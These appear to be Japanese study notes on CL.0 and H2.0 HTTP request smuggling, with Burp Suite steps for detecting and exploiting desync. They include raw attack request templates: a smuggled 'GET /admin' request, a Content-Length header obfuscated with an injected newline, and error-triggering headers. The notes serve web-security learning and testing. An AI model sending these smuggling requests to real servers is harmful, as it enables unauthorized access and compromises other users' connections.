###### Browser-powered request smugglingとは

- クライアントサイドでのリクエストスマグリング
- 複数のサーバ(フロントエンドとバックエンド)をもつ通信経路だけでなく、単独のサーバを攻撃することも可能になる

---
###### CL.0とは？悪用可能なシチュエーション

- フロントエンドが`CL`(`Content-Length`)でリクエストの終了位置を決定
- バックエンドサーバは`CL`を無視する場合 = `Content-Length: 0`
	- ヘッダの終わりがリクエストの終わり

---
### ⭐️CL.0自動悪用ステップ

###### 検出

1. ProxyのHTTP Historyからエンドポイント候補をCommandとクリックで全て選択
	- エンドポイントはsvgなどの静的ファイルが狙い目
2. HTTP Request SmugglerのCL.0を選択し、"Found issue: CL.0 desync"が表示されるか

###### 悪用

3. "Evidence: "のPOSTリクエストをRepeaterへコピーし、密輸リクエストで目的の処理を実行する

---
###### まとめ

- [[#CL.0脆弱性のprobe]]
- [[#CL.0の挙動を引き出す]]
- [[#CL.0のエクスプロイト]]
- [[#H2.0脆弱性]]

---
## CL.0脆弱性のprobe

###### 基本概念

- 部分的な密輸リクエストを送り、その後、通常のリクエストを行う。
- 部分的な密輸リクエストの影響を受けたか確認する
	- この際、通常のHRSと異なり`CL`の値は操作しない。

### CL.0 probeステップ

###### 1. 部分的な密輸リクエストを含むリクエストを1つのタブに作成する

- Repeaterタブ上部⚙️ -> "Update Content-Length"に☑️ (CLの値は操作しない)
- Repeaterタブ上部⚙️ -> Enable HTTP/1 connection reuseに☑️
- Request attribute -> HTTP/1.1を選択
- `Connection: keep-alive`を追加
```http
POST /[脆弱なエンドポイント] HTTP/1.1
Host: [ターゲットのホスト名]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
X-Ignore: X
```

###### 2. もう1つのタブに通常のリクエストを追加する

- Request attribute -> HTTP/1.1を選択
```http
GET / HTTP/1.1
Host: [ターゲットのホスト名]
```

###### 3. 1, 2の順でGroupに追加する
###### 4. Send group in sequence (single connection)
###### 5. ２のレスポンスに404 Not Foundが返ればCL.0を検出した

---
## CL.0の挙動を引き出す

- CL.0 probeで脆弱なエンドポイントを検出できないときは、CL.0の挙動を引き出す必要がある

###### 基本概念

- リクエストのヘッダによってサーバエラーがトリガーされるとき、いくつかのサーバはリクエストボディを[[📕#ソケット]]から消費せずにエラーレスポンスを返す。
- その後に==コネクションを閉じない場合==、これはCL.0脆弱性ベクターの代替となる。
	- つまり、body部が後続のリクエストの頭にくっつきエラーが起きる

- また、`GET`リクエストに難読化した`CL`ヘッダを使用すると、フロントエンドは`CL`を認識するがバックエンドは認識しないという非同期が発生する。
	- つまり、バックエンドがbodyを認識しないので、bodyが後続のリクエストの頭にくっつく

### 方法①：ヘッダでエラーを起こす

1. 1つのタブに存在しないサーバエラーを引き起こすためのヘッダを指定したリクエストを作成
	- [[#CL.0 probeステップ]]のステップ1と同じ設定変更は忘れずに
```http
POST /[脆弱なエンドポイント候補] HTTP/1.1
Host: [ターゲットのホスト名]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
X-Ignore: x

hogehoge
```
2. CL.0 probeのステップ2以降と同じ

- もし"Connection closed during request sequence"と表示されたら失敗。次の方法を試す

### 方法②GET × Content-Lengthの難読化

1. 1つのタブに難読化したCLとbody部を含むGETリクエストを作成する
	- [[#CL.0 probeステップ]]のステップ1と同じ設定変更は忘れずに
```http
GET /[脆弱なエンドポイント候補] HTTP/1.1
Host: [ターゲットのホスト名]
Connection: keep-alive
X: X[\n]Content-Length: 34

hogehoge
```
2. CL.0 probeのステップ2以降と同じ

- 参考：[[2. 基本的なHRSの実行#TE.TE脆弱性]]

---
## CL.0のエクスプロイト

1. Issueに表示されたRequestの中で、POSTリクエストとその中に密輸リクエストを含むRequestをRepeaterへ送る
2. 密輸リクエストを含むPOSTリクエストを1つ目、通常の`GET /`リクエストを2つ目の順でGroup化
3. 密輸リクエストを目的を実行する内容に書き換え、Send group in sequence(single connection)。2つ目のリクエスト(`GET /`)で目的達成を確認
```http
POST /[脆弱なエンドポイント] HTTP/1.1
Host: [ターゲットのホスト名]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /admin HTTP/1.1
X-Ignore: X
```

---
## H2.0脆弱性

- HTTP2を1へダウングレード([[1. HTTP2 request smuggling#HTTP/2 downgrading]])するサイトは、バックエンドサーバがダウングレードされたリクエストの`Content-Length`ヘッダーを無視した場合、同等の "H2.0 "問題に脆弱になる可能性がある


